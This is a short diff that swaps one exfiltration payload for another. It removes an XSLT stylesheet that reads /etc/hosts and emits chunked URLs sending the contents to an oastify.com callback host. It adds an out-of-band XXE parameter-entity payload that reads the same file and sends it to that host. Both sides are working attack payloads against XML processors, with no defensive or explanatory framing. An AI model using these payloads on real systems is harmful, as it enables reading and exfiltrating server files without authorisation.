@@ -1,16 +1,4 @@
-<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-  <xsl:output method="text" encoding="UTF-8"/>
-  <xsl:template match="/">
-    <xsl:variable name="txt" select="unparsed-text('file:///etc/hosts')"/>
-    <xsl:variable name="len" select="string-length($txt)"/>
-    <!-- Chunk conservador -->
-    <xsl:variable name="chunk" select="60"/>
-    <xsl:for-each select="1 to ceiling($len div $chunk)">
-      <xsl:variable name="i" select="."/>
-      <xsl:variable name="start" select="(($i - 1) * $chunk) + 1"/>
-      <xsl:variable name="part" select="substring($txt, $start, $chunk)"/>
-      <xsl:value-of select="concat('http://nypvkqtw1r4om2a9pzu4624y4pajy9my.oastify.com/?p=', encode-for-uri($part), '&amp;idx=', $i)"/>
-      <xsl:text>&#10;</xsl:text>
-    </xsl:for-each>
-  </xsl:template>
-</xsl:stylesheet>
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nypvkqtw1r4om2a9pzu4624y4pajy9my.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
